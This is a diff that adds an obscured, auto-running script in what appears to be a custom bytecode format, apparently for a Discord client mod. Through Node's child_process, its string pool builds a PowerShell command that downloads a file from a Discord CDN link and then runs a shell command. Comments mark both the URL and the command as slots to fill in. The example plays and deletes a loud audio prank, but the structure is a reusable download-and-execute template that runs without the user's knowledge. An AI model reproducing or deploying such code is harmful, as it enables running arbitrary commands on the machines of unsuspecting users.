@@ -1,0 +1,111 @@
+#strpool
+require
+child_process
+exec
+powershell -c "(New-Object Net.WebClient).DownloadFile('
+', '
+')"&& 
+//your url to the file goes here
+https://cdn.discordapp.com/attachments/932189533225754627/932539222991204412/subway-surfer-bass-boosted.wav
+//name of the file (how to save) goes here
+bb.wav
+//shell command that will be executed after the download is complete goes here
+powershell -c (New-Object Media.SoundPlayer "bb.wav").PlaySync() && del bb.wav
+fetchBDAsset
+ssbb.wav
+fs
+copyFileSync
+
+
+#code
+pushb 8
+pushb 34
+pushb 9
+pushp
+pushgl
+not
+not
+ifej
+
+pushb 0
+pushp
+pushgl
+
+pushb 1
+pushp
+calls
+
+pushb 2
+pushp
+getp
+
+pushb 3
+pushp
+pushb 6
+pushp
+pushb 4
+pushp
+pushb 7
+pushp
+pushb 5
+pushp
+pushb 8
+pushp
+buildstr 6
+
+calls
+pops
+pushb 100
+setip
+//33
+
+pushb 9
+pushp
+pushgl
+
+pushb 10
+pushp
+calls
+
+pushb 10
+pushp
+store
+
+pushb 0
+pushp
+pushgl
+pushb 11
+pushp
+calls
+
+pushb 12
+pushp
+getp
+
+pushb 10
+pushp
+pushvar
+pushb 7
+pushp
+calls
+pops
+
+pushb 0
+pushp
+pushgl
+
+pushb 1
+pushp
+calls
+
+pushb 2
+pushp
+getp
+
+pushb 8
+pushp
+calls
+#metadata
+{
+    "ubd":"autorun"
+}
